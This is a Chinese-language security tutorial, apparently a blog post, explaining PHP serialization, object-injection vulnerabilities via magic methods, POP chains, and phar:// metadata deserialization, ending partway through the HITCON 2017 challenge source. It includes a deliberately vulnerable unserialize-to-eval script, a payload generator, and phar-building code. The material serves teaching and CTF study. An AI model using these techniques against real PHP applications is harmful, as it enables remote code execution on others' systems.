什么样子的</strong>？</p><p><strong>如图所示:</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/json%20%E6%98%BE%E7%A4%BA.png" alt="此处输入图片的描述"></p><span id="more"></span><p>我们看到不同组数据之间都是使用逗号分隔，每组数据内部使用冒号分隔键和值，整体看上去是一个字符串的样子，那么他原来的面目是什么呢？</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/json%20%E7%94%9F%E6%88%90.png" alt="此处输入图片的描述"></p><p>我们看到，这个 json 字符串的真面目是一个数组，但是通常情况下为了前后端之间的传输方便我们将其 json_encode 了，然后我们后端如果接受到这个 json 数据，还能在 json_decode 回来，再通俗一点就是tx 目前不支持直接传输文件夹，我们必须要压缩一下然后传输，对方接收到需要解压才能看到你的数据，那么这种将原本的数据通过某种手段进行“压缩”，并且按照一定的格式存储的过程就可以称之为序列化</p><h3 id="2-PHP-的序列化"><a href="#2-PHP-的序列化" class="headerlink" title="2.PHP 的序列化"></a><strong>2.PHP 的序列化</strong></h3><p>PHP 的所谓的序列化也是一个将各种类型的数据，压缩并按照一定格式存储的过程，他所使用的函数是serialize() ,我们来看下面的实例</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php%20serialize0.png" alt="此处输入图片的描述"></p><p>这是一个简单的 php 类，然后我们实例化以后对其属性进行了赋值，然后调用了 serialize() 并且输出，我们看一下输出的结果</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%93%E6%9E%9C1.png" alt="此处输入图片的描述"></p><p>我们看到这个和刚刚的 json 长得有些不一样了，具体的含义我已经在途中有所标注（其中属性名和属性值的格式与前面对象名的格式类似我就没有重复说明）</p><blockquote><p><strong>注意：这里是第一个非常重要的点</strong></p><p>如果你是细心的同学，你可能会注意到一个小问题，按照我前面对象名的格式算的话你可能会发现后面的属性名有些另类，你看啊,我代码里面明明写的是<br>flag 属性，序列化以后却变成了 testflag ，而且前面说好的长度也不一样了，testflag<br>明明是8个字符，到你这里却成了10个，除此之外后面的 test 属性也“变异了”，前面多了个（*）并且长度也不对，这到底是咋了？</p></blockquote><p>嗯，如果你发现这个问题，那么说明你认真地思考了，这其实涉及到了 PHP 的属性的访问权限问题，序列化为了能把整个类对象的各种信息完完整整的压缩，格式化，必然也会将属性的权限序列化进去，我们发现我定义的类的属性有三种 private protected 和 默认的 public(写不写都一样)，其中</p><p><strong>(1)Puiblic 权限：</strong></p><p>他的序列化规规矩矩，按照我们常规的思路，该是几个字符就是几个字符，你看那个 test1 属性，是不是这样？</p><p><strong>(2)Private 权限：</strong></p><p>该权限是私有权限，也就是说只能 test类使用，于是乎 test 有着强烈的占有欲，于是在序列化的时候一定要在 private 属性前面加上自己的名字，向世界表明这个属性是我独自占有的，但是好像长度还是不对，还少了两个，怎么回事？</p><p>这样，我们将其序列化的结果存入一个文件中，我们使用 Hexdump 看一下内部的结构，为了去除浏览器对整个过程的影响我修改一下代码</p><pre><code class="hljs">&lt;?phpclass test&#123;    private $flag = &#39;Inactive&#39;;    protected $test = &quot;test&quot;;    public $test1 = &quot;test1&quot;;    public function set_flag($flag)    &#123;        $this-&gt;flag = $flag;    &#125;    public function get_flag($flag)    &#123;        return $this-&gt;flag;    &#125;&#125;$object = new test();$object-&gt;set_flag(&#39;Active&#39;);$data = serialize($object);file_put_contents(&quot;serialize.txt&quot;, $data);</code></pre><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/private%20%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="此处输入图片的描述"></p><p>我们看到 test 的前后出现了两个 %00 ，也就是空白符，现在是不是字符数也凑够了？那么现在请你记住这个规定，在私有属性序列化的时候格式是</p><pre><code class="hljs">%00类名%00属性名</code></pre><p><strong>(2)Protected 权限：</strong></p><p>这个也很奇怪，但是没关系我们看 hexdump 的结果</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/protected%20%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="此处输入图片的描述"></p><p>这里我就不详细说了，反正格式就是这样</p><pre><code class="hljs">%00*%00属性名</code></pre><p>这个特性一定要非常的清楚，如果很模糊的话，在我们后期构造或者修改我们的攻击向量的时候很容易出现错误</p><blockquote><p><strong>注意：这里是第二个非常重要的点</strong></p><p>如果你再细致一点，你可能会发现这样一个问题，你这个类定义了那么多方法，怎么把对象序列化了以后全都丢了？你看你整个序列化的字符串里面全是属性，就没有一个方法，这是为啥？</p></blockquote><p>请记住，序列化他只序列化属性，不序列化方法，这个性质就引出了两个非常重要的话题：</p><p><strong>(1)我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在</strong></p><p>这里不得不扯出反序列化的问题，这里先简单说一下，反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要依托于这个类要在当前作用域存在的条件。</p><p><strong>(2)我们在反序列化攻击的时候也就是依托类属性进行攻击</strong></p><p>因为没有序列化方法嘛，我们能控制的只有类的属性，因此类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击（这是我们攻击的核心思想，这里先借此机会抛出来，大家有一个印象）</p><h3 id="3-PHP-的反序列化"><a href="#3-PHP-的反序列化" class="headerlink" title="3.PHP 的反序列化"></a><strong>3.PHP 的反序列化</strong></h3><p>有序列化 化对象为压缩格式化的字符串，就有反序列化，将压缩格式化的字符串还原</p><p>我们还是沿用上面的代码，我现在将 serialize.txt 里面的内容进行反序列化，并输出属性值 test1 和 flag 的值</p><p><strong>如图所示:</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHP%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%201.png" alt="此处输入图片的描述"></p><p><strong>结果如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96__%E7%BB%93%E6%9E%9C1.png" alt="此处输入图片的描述"></p><p>我们看到本来存储在文件中的一串字符，在 uiseralize() 的作用下还原成了对象，并且实现了 属性和方法的调用</p><p>那我拓展一下，比如说我是一个黑客，我想使坏，我在电脑主人不知道的情况下悄悄改了这个 serialize.txt 的内容，改成了下面这样**（注意红色方框的部分）**</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AF%A1%E6%94%B9%E5%B1%9E%E6%80%A71.png" alt="此处输入图片的描述"></p><p>那么当电脑主人运行这段代码的时候看到的会是什么呢？</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AF%A1%E6%94%B9%E5%90%8E%E5%BE%97%E5%88%B0%E7%9A%84%E7%BB%93%E6%9E%9C1.png" alt="此处输入图片的描述"></p><p>哇咔咔， K0rz3n Hack 成功，想必电脑主人会吓一跳，会不会赶紧打开杀毒软件进行全盘的扫描呢？hhh，当然这就不是我要考虑的问题了，<strong>这个小例子其实就是我们反序列化攻击的原理的核心内容</strong>，这里算是抛砖引玉吧</p><h2 id="0X02-为什么要-PHP-的序列化和反序列化"><a href="#0X02-为什么要-PHP-的序列化和反序列化" class="headerlink" title="0X02 为什么要 PHP 的序列化和反序列化"></a><strong>0X02 为什么要 PHP 的序列化和反序列化</strong></h2><p>看到这里，肯定会有人问这个问题，如果说 json 是为了传递数据的方便性，那么 PHP 的序列化又是为了什么呢？</p><p>当然，传递数据的方便肯定是这种压缩并格式化存储的一大共同的属性，那么序列化除了这种属性以外还有什么特性呢？要是只是这样那干脆不如直接用 json 好了，当然有，从上面的实验中你没发现吗？我们把一个实例化的对象长久地存储在了计算机的磁盘上，无论什么时候调用都能恢复原来的样子，这其实是为了解决 PHP 对象传递的一个问题,因为 PHP 文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策，总不能你永远不让它销毁，等着你吧，于是人们就想出了一种能长久保存对象的方法，这就是 PHP 的序列化，那当我们下次要用的时候只要反序列化一下就 ok 啦，是不是很方便？</p><h2 id="0X03-PHP-反序列化漏洞"><a href="#0X03-PHP-反序列化漏洞" class="headerlink" title="0X03 PHP 反序列化漏洞"></a><strong>0X03 PHP 反序列化漏洞</strong></h2><h3 id="1-概念解释："><a href="#1-概念解释：" class="headerlink" title="1.概念解释："></a><strong>1.概念解释：</strong></h3><p>PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，我觉得这个表达很不直白，也不能说明根本的问题，不如我们叫他 PHP 对象的属性篡改漏洞好了(别说这是我说的~~)</p><p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。</p><h3 id="2-必须知道的魔法方法："><a href="#2-必须知道的魔法方法：" class="headerlink" title="2.必须知道的魔法方法："></a><strong>2.必须知道的魔法方法：</strong></h3><p>这里就不得不介绍几个我们必须知道的魔法方法了</p><p>(1)__construct()：当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。<br>(2)__wakeup() ：unserialize()时会自动调用<br>(3)__destruct()：当对象被销毁时会自动调用。<br>(4)__toString():当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用<br>(5)__get() :当从不可访问的属性读取数据<br>(6)__call(): 在对象上下文中调用不可访问的方法时触发<br><strong>其中我想特别说明一下第四点：</strong></p><p>这个 __toString 触发的条件比较多，也因为这个原因容易被忽略，常见的触发条件有下面几种</p><blockquote><p>(1)echo (<code>$obj</code>) &#x2F; print(<code>$obj</code>) 打印时会触发</p><p>(2)反序列化对象与字符串连接时</p><p>(3)反序列化对象参与格式化字符串时</p><p>(4)反序列化对象与字符串进行&#x3D;&#x3D;比较时（PHP进行&#x3D;&#x3D;比较的时候会转换参数类型）</p><p>(5)反序列化对象参与格式化SQL语句，绑定参数时</p><p>(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</p><p>(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有__toString返回的字符串的时候__toString会被调用</p><p>(8)反序列化的对象作为 class_exists() 的参数的时候</p></blockquote><h3 id="3-为什么要提到这些魔法方法"><a href="#3-为什么要提到这些魔法方法" class="headerlink" title="3.为什么要提到这些魔法方法"></a><strong>3.为什么要提到这些魔法方法</strong></h3><p>为什么要提到这些魔法方法？你看你上面的实现的最简单的攻击不是也没有用到魔法方法吗，我想肯定有人要问这个问题，我曾经也问过自己这个问题。</p><p>我们上面讲过，在我们的攻击中，反序列化函数 unserialize() 是我们攻击的入口，也就是说，只要这个参数可控，我们就能传入任何的已经序列化的对象（只要这个类在当前作用域存在我们就可以利用），而不是局限于出现 unserialize() 函数的类的对象，如果只能局限于当前类，那我们的攻击面也太狭小了，这个类不调用危险的方法我们就没法发起攻击。</p><p>但是我们又知道，你反序列化了其他的类对象以后我们只是控制了是属性，如果你没有在完成反序列化后的代码中调用其他类对象的方法，我们还是束手无策，毕竟代码是人家写的，人家本身就是要反序列化后调用该类的某个安全的方法，你总不能改人家的代码吧，但是没关系，因为我们有魔法方法。</p><p>魔法正如上面介绍的，魔法方法的调用是在该类序列化或者反序列化的同时自动完成的，不需要人工干预，这就非常符合我们的想法，因此只要魔法方法中出现了一些我们能利用的函数，我们就能通过反序列化中对其对象属性的操控来实现对这些函数的操控，进而达到我们发动攻击的目的。</p><h3 id="4-调用魔法方法的例子"><a href="#4-调用魔法方法的例子" class="headerlink" title="4.调用魔法方法的例子"></a><strong>4.调用魔法方法的例子</strong></h3><p>说那么多，我们来看一个反序列化的案例，加强一下我们对这个魔法方法的理解吧</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E6%B5%8B%E8%AF%95.png" alt="此处输入图片的描述"></p><p><strong>测试的结果：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C.png" alt="此处输入图片的描述"></p><p>读者可以按照我上面说的魔法方法的触发规则分析一下这个结果是怎么来的，我就不详细分析了，也比较简单，就是提示一下这里 __destruct 了两次说明当前实际上有两个对象，一个就是实例化的时候创建的对象，另一个就是反序列化后生成的对象。</p><h3 id="5-利用魔法方法发起攻击"><a href="#5-利用魔法方法发起攻击" class="headerlink" title="5.利用魔法方法发起攻击"></a><strong>5.利用魔法方法发起攻击</strong></h3><p><strong>测试代码：</strong></p><pre><code class="hljs">&lt;?phpclass K0rz3n &#123;    private $test;    public $K0rz3n = &quot;i am K0rz3n&quot;;    function __construct() &#123;        $this-&gt;test = new L();    &#125;        function __destruct() &#123;        $this-&gt;test-&gt;action();    &#125;&#125;class L &#123;    function action() &#123;        echo &quot;Welcome to XDSEC&quot;;    &#125;&#125;class Evil &#123;    var $test2;    function action() &#123;        eval($this-&gt;test2);    &#125;&#125;unserialize($_GET[&#39;test&#39;]);</code></pre><p> 我们先来分析一下这段代码，首先我们能看到 unserialize() 函数的参数我们是可以控制的，也就是说我们能通过这个接口反序列化任何类的对象(但只有在当前作用域的类才对我们有用)，那我们看一下当前这三个类，我们看到后面两个类反序列化以后对我们没有任何意义，因为我们根本没法调用其中的方法，但是第一个类就不一样了，虽然我们也没有什么代码能实现调用其中的方法的，但是我们发现他有一个魔法函数 __destruct() ，这就非常有趣了，因为这个函数能在对象销毁的时候自动调用，不用我们人工的干预，好，既然这样我们就决定反序列化这个类的对象了，接下来让我们看一下怎么利用(我上面说过了，我们需要控制这个类的某些属性，通过控制属性实现我们的攻击)</p><p> 那我们看一下哪些属性的控制是对我们有用的(这个时候我们就跳过了__construct() 方法，毕竟他永远不会被调用)，因为这个例子比较简单，__destruct() 里面只用到了一个属性 test ，那肯定就是他了，那我们控制这个属性为什么内容我们就能攻击了呢，我们再观察一下 那些地方调用了 action() 函数，看看这个函数的调用中有没有存在执行命令或者是其他我们能利用的点的，果然我们在 Evil 这个类中发现他的 action() 函数调用了 eval(),那我们的想法就很明确了，我们需要将 K0rz3n 这个类中的 test 属性篡改为 Evil 这个类的对象，然后为了 eval 能执行命令，我们还要篡改 Evil 对象的 test2 属性，将其改成我们的 Payload</p><p>分析完毕以后我们就可以构建我们的序列化字符串了，构建的方法不是手写(当然你愿意我也不拦着你，理论上是可行的)，我们要将这段代码复制一下，然后修改一些内容并进行序列化操作</p><p><strong>生成 payload 代码：</strong></p><pre><code class="hljs">&lt;?phpclass K0rz3n &#123;    private $test;    function __construct() &#123;        $this-&gt;test = new Evil;    &#125;&#125;class Evil &#123;    var $test2 = &quot;phpinfo();&quot;;&#125;$K0rz3n = new K0rz3n;$data = serialize($K0rz3n);file_put_contents(&quot;seria.txt&quot;, $data);</code></pre><p>我们去除了一切与我们要篡改的属性无关的内容，对其进行序列化操作，然后将序列化的结果复制出来，想刚刚的代码发起请求</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB1.png" alt="此处输入图片的描述"></p><p>可以看到我们攻击成功，特别要提醒一下的就是我在图中框起来的部分，上面说过由于是私有属性，他有自己特殊的格式会在前后加两个 %00 ，所以我们在传输过程中国绝对不能忘掉</p><p><strong>通过这个简单的例子总结一下寻找 PHP 反序列化漏洞的方法或者说流程</strong></p><p>(1)寻找 unserialize() 函数的参数是否有我们的可控点<br>(2)寻找我们的反序列化的目标，重点寻找 存在 __wakeup() 或 __destruct() 魔法函数的类<br>(3)<strong>一层一层</strong>地研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的<br>(4)找到我们要控制的属性了以后我们就将要用到的代码部分复制下来，然后构造序列化，发起攻击</p><h2 id="0X04-POP-链的介绍"><a href="#0X04-POP-链的介绍" class="headerlink" title="0X04 POP 链的介绍"></a><strong>0X04 POP 链的介绍</strong></h2><p>玩过 pwn 的同学应该对 ROP 并不陌生，ROP 的全称是面向返回编程(Return-Oriented Programing),ROP 链构造中是寻找<strong>当前系统环境中</strong>或者<strong>内存环境里已经存在的</strong>、具有固定地址且带有返回操作的指令集,将这些<strong>本来无害的片段</strong>拼接起来，形成一个连续的层层递进的调用链，最终达到我们的执行 libc 中函数或者是 systemcall 的目的</p><p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是<strong>从现有运行环境</strong>中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的</p><p>说的再具体一点就是 ROP 是通过栈溢出实现控制指令的执行流程，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的</p><p><strong>说了这么多理论了，来点实战性的东西演示一下 POP 链的形成吧！</strong></p><h3 id="1-POP-链实战"><a href="#1-POP-链实战" class="headerlink" title="1.POP 链实战"></a><strong>1.POP 链实战</strong></h3><p>整个代码片段我将以图片的形式展现，有兴趣的读者请先自己分析，之后在看我的分析，<strong>当然这个案例里面似乎少了比较关键的 unserialize() 函数，那我们就假设这个 unserialize() 在我们的第一张图片的里面，并且参数完全可控</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%981.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%982.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%983.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%984.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%985.png" alt="此处输入图片的描述"></p><p>现在我们就按照，我上面说的步骤来一步一步的分析这段代码，最终构造我们的 POP 链完成利用</p><p><strong>(1)寻找 unserialize() 函数的参数是否有我们的可控点</strong></p><p>这个我上面说了，我们假设已经在第一段代码里设置了参数可控的 unserialize() ，所以这一步就可以跳过</p><p><strong>(2)寻找我们的反序列化的目标，重点寻找 存在 __wakeup() 或 __destruct() 魔法函数的类</strong></p><p>我们在第一段代码中寻找，我们发现一眼就看到了我们最想要看到的东西，__destruct() 魔法方法，好，既然这样我们就将这个类作为我们的漏洞嫌疑对象</p><p><strong>(3)一层一层地研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的</strong></p><p>1.我们就先来看一下这个 <code>$write</code> ，这个 <code>$write</code> 虽然不是属性，但是他是我们 <code>$_write</code> 属性的其中一部分，那么控制他也就等于控制属性，那我们就要好好研究一下这个 $write 了，他是什么呢？通过他能调用 shutdown() 来看,他是某一个类的一个对象，因为他不是单纯的属性所以我们还要向下挖</p><p>2.于是我们就要找一下定义 shutdown() 方法的类，然后我们就锁定了 Zend_Log_Writer_Mail 这个类，我们看到这个类里面使用了 $write 对象的很多属性，比如说 _layout ，然后我们又发现这个属性也调用了一个方法 render() ，说明这个属性其实也是一个对象，于是我们还要向更深处挖掘</p><p>3.那么 _layout 是谁的对象呢？我们发现他是 Zend_layout 的一个对象，同样的，他里面是用了一个 _inflector 的属性，这个属性调用了 filter 方法，看来他也是一个对象（有完没完~~）别急，我们继续向下</p><p>4.我们发现 _inflector 是 Zend_Filter_PregReplace 的一个对象，这个对象的一些属性是能进行直接控制的，并且在调用 filter 方法的时候能直接触发 preg_replace() 方法，太好了这正是我们想要的，我们只要控制这个对象的属性就能实现我们的利用链</p><p>最后一张 图片实际上已经将整个利用链画了出来，并且给上了 payload ，下面我想通过对整个 payload 的分析再来回顾一下整个 POP 链的调用过程</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%E9%93%BE%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90.png" alt="此处输入图片的描述"></p><p>所以整个 POP 链就是</p><pre><code class="hljs">writer-&gt;shutdown()-&gt;render()-&gt;filter()-&gt;preg_replace(我们控制的属性)-&gt;代码执行</code></pre><blockquote><p><strong>声明：</strong><br>当然这是一个很老的但是很经典的例子，里面用到的方法还是 preg_replace() 的 &#x2F;e 选项，我们只是学习使用，请大家不要纠结</p></blockquote><h2 id="0X05-利用-phar-拓展-PHP-反序列化的攻击面"><a href="#0X05-利用-phar-拓展-PHP-反序列化的攻击面" class="headerlink" title="0X05 利用 phar:&#x2F;&#x2F; 拓展 PHP 反序列化的攻击面"></a><strong>0X05 利用 phar:&#x2F;&#x2F; 拓展 PHP 反序列化的攻击面</strong></h2><p>在 2017 年的 hitcon Orange 的一道 0day 题的解法令人震惊，Orange 通过他对底层的深度理解，为 PHP 反序列化开启了新的篇章，在此之后的 black 2018 演讲者同样用这个话题讲述了 phar:&#x2F;&#x2F; 协议在 PHP 反序列化中的神奇利用，那么接下来就让我们分析他为什么开启了 PHP 反序列化的新世界,以及剖析一下这个他的利用方法。</p><h3 id="1-回顾一下原先-PHP-反序列化攻击的必要条件"><a href="#1-回顾一下原先-PHP-反序列化攻击的必要条件" class="headerlink" title="1.回顾一下原先 PHP 反序列化攻击的必要条件"></a><strong>1.回顾一下原先 PHP 反序列化攻击的必要条件</strong></h3><p>(1)首先我们必须有 unserailize() 函数<br>(2)unserailize() 函数的参数必须可控</p><p>这两个是原先存在 PHP 反序列化漏洞的必要条件，没有这两个条件你谈都不要谈，根本不可能，但是从2017 年开始 Orange 告诉我们是可以的</p><h3 id="2-phar-如何扩展反序列化的攻击面的"><a href="#2-phar-如何扩展反序列化的攻击面的" class="headerlink" title="2.phar:&#x2F;&#x2F; 如何扩展反序列化的攻击面的"></a><strong>2.phar:&#x2F;&#x2F; 如何扩展反序列化的攻击面的</strong></h3><p>原来 phar 文件包在 生成时会以序列化的形式存储用户自定义的 meta-data ，配合 phar:&#x2F;&#x2F; 我们就能在文件系统函数 file_exists() is_dir() 等参数可控的情况下实现自动的反序列化操作，于是我们就能通过构造精心设计的 phar 包在没有 unserailize() 的情况下实现反序列化攻击，从而将 PHP 反序列化漏洞的触发条件大大拓宽了，降低了我们 PHP 反序列化的攻击起点。</p><h3 id="3-具体解释一下-phar-的使用"><a href="#3-具体解释一下-phar-的使用" class="headerlink" title="3.具体解释一下 phar 的使用"></a><strong>3.具体解释一下 phar 的使用</strong></h3><h4 id="1-Phar-的文件结构"><a href="#1-Phar-的文件结构" class="headerlink" title="1.Phar 的文件结构"></a><strong>1.Phar 的文件结构</strong></h4><p>phar 文件最核心也是必须要有的部分如图所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Phar%E6%A0%BC%E5%BC%8F%E5%BF%85%E9%A1%BB%E8%A6%81%E6%B1%82%E7%9A%84.png" alt="此处输入图片的描述"></p><p><strong>(1) a stub</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/stub.png" alt="此处输入图片的描述"></p><p>图片中说了，这其实就是一个PHP 文件实际上我们能将其复杂化为下面这个样子</p><p><strong>格式为:</strong></p><pre><code class="hljs">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code></pre><p>前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，这部分的目的就是让 phar 扩展识别这是一个标准的 phar 文件</p><p><strong>(2）a manifest describing the contents</strong></p><p>因为 Phar 本身就是一个压缩文件，它里面存储着其中每个被压缩文件的权限、属性等信息。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar%20manifest.png" alt="此处输入图片的描述"></p><p><strong>(3)the file contents</strong></p><p>这部分就是我们想要压缩在 phar 压缩包内部的文件</p><h4 id="2-如何创建一个合法的-Phar压缩文件"><a href="#2-如何创建一个合法的-Phar压缩文件" class="headerlink" title="2.如何创建一个合法的 Phar压缩文件"></a><strong>2.如何创建一个合法的 Phar压缩文件</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;phar.phar&quot;);    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar        $phar-&gt;startBuffering();        $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub        $o = new TestObject();        $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算        $phar-&gt;stopBuffering();?&gt;</code></pre><p>因为不是文本文件，我们使用 hexdump 看一下文件的内容</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar%20%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90.png" alt="此处输入图片的描述"></p><p>可以清楚地看到我们的 TestObject 类已经以序列化的形式存入文件中</p><p>我们刚刚说过了，php一大部分的文件系统函数在通过phar:&#x2F;&#x2F;伪协议解析phar文件时，都会将meta-data进行反序列化</p><p><strong>测试后受影响的函数如下：</strong></p><p>|受影响的函数列表| | |<br>|:–|:–|:–|:–|<br>|fileatime|filectime|file_exists|file_get_contents|<br>|file_put_contents|file|filegroup|fopen|<br>|fileinode|filemtime|fileowner|fikeperms|<br>|is_dir|is_executable|is_file|is_link|<br>|is_readable|is_writable|is_writeable|parse_ini_file<br>|copy|unlink|stat|readfile|</p><h4 id="3-phar-反序列化小实验"><a href="#3-phar-反序列化小实验" class="headerlink" title="3.phar 反序列化小实验"></a><strong>3.phar 反序列化小实验</strong></h4><p>我们来做一个小测试看一下是不是真的和说的一样会反序列化</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?php     class TestObject &#123;        public function __destruct() &#123;            echo &#39;Destruct called&#39;;        &#125;    &#125;    $filename = &#39;phar://phar.phar/test.txt&#39;;    file_get_contents($filename); ?&gt;</code></pre><p><strong>结果如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%88%90%E5%8A%9F.png" alt="此处输入图片的描述"></p><p>可以看出我们成功的在没有 unserailize() 函数的情况下，通过精心构造的 phar 文件，再结合 phar:&#x2F;&#x2F; 协议，配合文件系统函数，实现了一次精彩的反序列化操作。</p><h4 id="4-phar-的实战"><a href="#4-phar-的实战" class="headerlink" title="4.phar 的实战"></a><strong>4.phar 的实战</strong></h4><p>这一部分的内容我打算使用 Orange 在 2017 年 hitcon 上面出的利用 Phar 进行反序列化，毕竟这是第一次出现这种利用方式的地方，应该来说是最经典的利用场景</p><p><strong>题目源码如下：</strong></p><pre><code class="hljs">&lt;?php    $FLAG    = create_function(&quot;&quot;, &#39;die(`/read_flag`);&#39;);                    // 得到 flag 的匿名函数    $SECRET  = `/read_secret`;    $SANDBOX = &quot;/var/www/data/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);   // 根据 remote_addr 给每个人创建一个沙盒    @mkdir($SANDBOX);    @chdir($SANDBOX);    if (!isset($_COOKIE[&quot;session-data&quot;])) &#123;                        $data = serialize(new User($SANDBOX));        $hmac = hash_hmac(&quot;sha1&quot;, $data, $SECRET);        setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac));      //将每个人唯一的沙盒对象加上签名后作为 session-data    &#125;    class User &#123;        public $avatar;        function __construct($path) &#123;            $this-&gt;avatar = $path;                                          //设置了头像的路径为沙盒路径        &#125;    &#125;    class Admin extends User &#123;        function __destruct()&#123;            $random = bin2hex(openssl_random_pseudo_bytes(32));            eval(&quot;function my_function_$random() &#123;&quot;                .&quot;  global \$FLAG; \$FLAG();&quot;                                /*反序列化这个对象就能创建一个随机名字的函数，调用这个函数就能调用 flag，实际上这是一个骗局，匿名函数也是有名字的*/                .&quot;&#125;&quot;);            $_GET[&quot;lucky&quot;]();        &#125;       &#125;    function check_session() &#123;        global $SECRET;        $data = $_COOKIE[&quot;session-data&quot;];        list($data, $hmac) = explode(&quot;-----&quot;, $data, 2);        if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac))            die(&quot;Bye&quot;);        if ( !hash_equals(hash_hmac(&quot;sha1&quot;, $data, $SECRET), $hmac) )            die(&quot;Bye Bye&quot;);        $data = unserialize($data);        if ( !isset($data-&gt;avatar) )            die(&quot;Bye Bye Bye&quot;);        return $data-&gt;avatar;                                               //判断身份，如果身份正确返回头像路径(沙盒路径)                                                                            //该函数不可绕过    &#125;    function upload($path) &#123;        $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;);            //获取头像，检查头是否为GIF89a ，正确后存入沙盒,                                                                            //这个就是利用 phar:// 进行反序列化的点        if (substr($data, 0, 6) !== &quot;GIF89a&quot;)            die(&quot;Fuck off&quot;);        file_put_contents($path . &quot;/avatar.gif&quot;, $data);        die(&quot;Upload OK&quot;);    &#125;    function show($path) &#123;                                                 //获取这个沙盒中的头像，        if ( !file_exists($path . &quot;/avatar.gif&quot;) )            $path = &quot;/var/www/html&quot;;        header(&quot;Content-Type: image/gif&quot;);     